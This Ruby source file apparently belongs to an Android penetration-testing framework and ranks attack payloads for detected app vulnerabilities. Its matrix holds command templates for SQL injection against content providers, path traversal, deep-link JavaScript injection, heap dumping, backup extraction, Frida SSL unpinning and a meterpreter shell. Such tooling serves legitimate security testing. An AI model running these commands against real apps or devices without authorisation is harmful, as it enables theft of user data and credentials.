module MPF
  module Intelligence
    # Smart Payload Recommendation System
    # Suggests optimal payloads based on detected vulnerabilities and attack context
    class PayloadRecommender

      # Vulnerability → payload recommendation matrix
      RECOMMENDATION_MATRIX = {
        'exported_provider_without_permission' => [
          {
            payload: 'payload/android/singles/provider_query',
            priority: 1,
            reason: 'Direct ContentProvider query to enumerate and extract all database records',
            expected_impact: 'Full database dump including credentials and PII',
            command_template: 'adb shell content query --uri content://<AUTHORITY>/<PATH>'
          },
          {
            payload: 'payload/android/singles/sql_injection',
            priority: 2,
            reason: 'SQL injection via provider selection parameter for deeper data access',
            expected_impact: 'Schema enumeration and cross-table data extraction',
            command_template: "adb shell content query --uri content://<AUTHORITY>/data --where \"id=' OR '1'='1\""
          },
          {
            payload: 'payload/android/singles/data_exfiltration',
            priority: 3,
            reason: 'Bulk data exfiltration from all accessible provider URIs',
            expected_impact: 'Complete application data extraction',
            command_template: 'adb shell content query --uri content://<AUTHORITY>/'
          }
        ],
        'exported_activity_without_permission' => [
          {
            payload: 'payload/android/singles/intent_injection',
            priority: 1,
            reason: 'Launch exported activity with crafted intent to bypass authentication',
            expected_impact: 'Authentication bypass and unauthorized screen access',
            command_template: 'adb shell am start -n <PACKAGE>/<ACTIVITY> --es key value'
          },
          {
            payload: 'payload/android/singles/deeplink_trigger',
            priority: 2,
            reason: 'Trigger activity via deep link with malicious parameters',
            expected_impact: 'Parameter injection and unintended state transitions',
            command_template: 'adb shell am start -a android.intent.action.VIEW -d "<DEEPLINK>"'
          },
          {
            payload: 'payload/android/meterpreter/app_shell',
            priority: 3,
            reason: 'Interactive shell for persistent access and exploration',
            expected_impact: 'Full interactive control of application context',
            command_template: 'use payload/android/meterpreter/app_shell'
          }
        ],
        'exported_service_without_permission' => [
          {
            payload: 'payload/android/singles/intent_injection',
            priority: 1,
            reason: 'Send crafted intent to exported service to trigger unintended behavior',
            expected_impact: 'Service manipulation and potential privilege escalation',
            command_template: 'adb shell am startservice -n <PACKAGE>/<SERVICE> --es action malicious'
          },
          {
            payload: 'payload/android/singles/permission_escalation',
            priority: 2,
            reason: 'Exploit service to escalate permissions within app context',
            expected_impact: 'Elevated privileges within application sandbox',
            command_template: 'adb shell am startservice -n <PACKAGE>/<SERVICE>'
          }
        ],
        'exported_receiver_without_permission' => [
          {
            payload: 'payload/android/singles/intent_injection',
            priority: 1,
            reason: 'Send broadcast to exported receiver with malicious extras',
            expected_impact: 'Trigger unintended application behavior via broadcast',
            command_template: 'adb shell am broadcast -a <ACTION> -n <PACKAGE>/<RECEIVER>'
          }
        ],
        'debuggable_enabled' => [
          {
            payload: 'payload/android/stages/memory_dump',
            priority: 1,
            reason: 'Dump application heap memory to extract runtime secrets and keys',
            expected_impact: 'Extraction of in-memory credentials, tokens, and encryption keys',
            command_template: 'adb shell am dumpheap <PID> /sdcard/heap.hprof'
          },
          {
            payload: 'payload/android/stages/method_hooking',
            priority: 2,
            reason: 'Hook authentication methods via JDWP to bypass security checks',
            expected_impact: 'Authentication bypass and runtime manipulation',
            command_template: 'jdb -attach localhost:8700'
          },
          {
            payload: 'payload/android/stagers/frida_injector',
            priority: 3,
            reason: 'Inject Frida agent for comprehensive runtime analysis',
            expected_impact: 'Full dynamic instrumentation and SSL unpinning',
            command_template: 'frida -U -f <PACKAGE> -l agent.js'
          }
        ],
        'allow_backup_enabled' => [
          {
            payload: 'payload/android/singles/file_extraction',
            priority: 1,
            reason: 'Extract complete application data via ADB backup',
            expected_impact: 'Full application data including databases and preferences',
            command_template: 'adb backup -f backup.ab -noapk <PACKAGE> && dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar xvf -'
          }
        ],
        'sql_injection' => [
          {
            payload: 'payload/android/singles/sql_injection',
            priority: 1,
            reason: 'Exploit SQL injection to dump complete database schema and contents',
            expected_impact: 'Full database exfiltration including all tables',
            command_template: "adb shell content query --uri content://<AUTHORITY>/data --where \"1=1 UNION SELECT name,sql,3,4,5 FROM sqlite_master--\""
          },
          {
            payload: 'payload/android/singles/data_exfiltration',
            priority: 2,
            reason: 'Exfiltrate all data accessible via SQL injection',
            expected_impact: 'Complete data extraction from vulnerable tables',
            command_template: "adb shell content query --uri content://<AUTHORITY>/data --where \"id=' OR '1'='1\""
          }
        ],
        'webview_js_enabled' => [
          {
            payload: 'payload/android/singles/deeplink_trigger',
            priority: 1,
            reason: 'Deliver malicious JavaScript via deep link to WebView',
            expected_impact: 'XSS execution in app context, cookie theft',
            command_template: 'adb shell am start -a android.intent.action.VIEW -d "<SCHEME>://<HOST>?url=javascript:alert(1)"'
          }
        ],
        'webview_add_js_interface' => [
          {
            payload: 'payload/android/singles/data_exfiltration',
            priority: 1,
            reason: 'Abuse JavaScript interface to access native Android APIs',
            expected_impact: 'Native code execution, filesystem access, data theft',
            command_template: 'Deliver HTML: <script>window.<INTERFACE>.sensitiveMethod()</script>'
          }
        ],
        'cleartext_traffic_allowed' => [
          {
            payload: 'payload/android/singles/data_exfiltration',
            priority: 1,
            reason: 'Intercept cleartext HTTP traffic to capture credentials and tokens',
            expected_impact: 'Credential theft, session hijacking, API key capture',
            command_template: 'mitmproxy --mode transparent -p 8080'
          }
        ],
        'path_traversal' => [
          {
            payload: 'payload/android/singles/file_extraction',
            priority: 1,
            reason: 'Exploit path traversal to read arbitrary files from app sandbox',
            expected_impact: 'Database files, preferences, private keys, certificates',
            command_template: 'adb shell content read --uri "content://<AUTHORITY>/../../databases/app.db"'
          }
        ],
        'root_detection_missing' => [
          {
            payload: 'payload/android/stagers/frida_injector',
            priority: 1,
            reason: 'Inject Frida on rooted device for comprehensive analysis',
            expected_impact: 'SSL unpinning, method hooking, memory access',
            command_template: 'frida -U -f <PACKAGE> --no-pause -l ssl_unpin.js'
          },
          {
            payload: 'payload/android/stages/ssl_unpinning',
            priority: 2,
            reason: 'Bypass SSL certificate pinning on rooted device',
            expected_impact: 'Full HTTPS traffic interception and manipulation',
            command_template: 'frida -U -f <PACKAGE> -l ssl_unpin.js'
          }
        ]
      }.freeze

      def self.recommend(findings, context = {})
        recommendations = []
        seen_payloads = {}

        findings.each do |finding|
          fid = (finding['id'] || finding[:id]).to_s
          recs = RECOMMENDATION_MATRIX[fid] || []

          recs.each do |rec|
            key = rec[:payload]
            existing = seen_payloads[key]
            if existing
              # Boost priority if same payload recommended for multiple vulns
              existing[:confidence] = [existing[:confidence] + 15, 100].min
              existing[:triggered_by] << fid
            else
              entry = {
                payload:          rec[:payload],
                priority:         rec[:priority],
                reason:           rec[:reason],
                expected_impact:  rec[:expected_impact],
                command_template: rec[:command_template],
                triggered_by:     [fid],
                confidence:       calculate_confidence(finding, rec),
                category:         categorize_payload(rec[:payload])
              }
              seen_payloads[key] = entry
              recommendations << entry
            end
          end
        end

        # Sort by confidence then priority
        sorted = recommendations.sort_by { |r| [-r[:confidence], r[:priority]] }

        {
          recommendations:    sorted,
          top_recommendation: sorted.first,
          by_category:        group_by_category(sorted),
          total:              sorted.length
        }
      end

      private

      def self.calculate_confidence(finding, rec)
        base = 70
        severity = (finding['severity'] || finding[:severity]).to_s
        base += 20 if severity == 'critical'
        base += 10 if severity == 'high'
        base += 5  if rec[:priority] == 1
        [base, 100].min
      end

      def self.categorize_payload(payload_path)
        if payload_path.include?('singles')    then 'immediate_execution'
        elsif payload_path.include?('stagers') then 'staged_delivery'
        elsif payload_path.include?('stages')  then 'advanced_capability'
        elsif payload_path.include?('meterpreter') then 'interactive_shell'
        else 'unknown'
        end
      end

      def self.group_by_category(recommendations)
        recommendations.group_by { |r| r[:category] }
      end
    end
  end
end
